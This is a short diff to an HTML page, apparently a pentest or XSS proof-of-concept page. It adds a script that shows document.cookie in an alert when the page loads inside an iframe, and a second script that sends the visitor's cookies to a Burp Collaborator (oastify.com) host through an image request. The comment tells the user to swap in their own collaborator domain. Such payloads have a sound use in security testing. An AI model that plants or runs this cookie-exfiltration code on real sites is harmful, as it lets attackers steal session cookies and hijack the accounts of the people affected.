@@ -96,11 +96,19 @@
     </script>
   </section>
 
-  <!-- 8. Alert if loaded in iframe -->
+  <!-- 8. Alert if loaded in iframe + Cookies-->
+ <script>
+  if (window.top !== window.self) {
+    alert("👀 Loaded in iframe — likely part of XSS or clickjacking chain.\n\n🍪 Cookies: " + document.cookie);
+  }
+</script>
+   <!-- 9. Send Cookies to the Collab-->
   <script>
-    if (window.top !== window.self) {
-      alert("👀 Loaded in iframe — likely part of XSS or clickjacking chain.");
-    }
-  </script>
+  const exfil = "t2wenwq764pqivxdk8vsvmw7eykp8mwb.oastify.com"; // Replace with your Burp Collaborator domain
+
+  if (document.cookie) {
+    new Image().src = "http://" + exfil + "/?" + "cookie=" + document.cookie;
+  }
+</script>
 </body>
 </html>
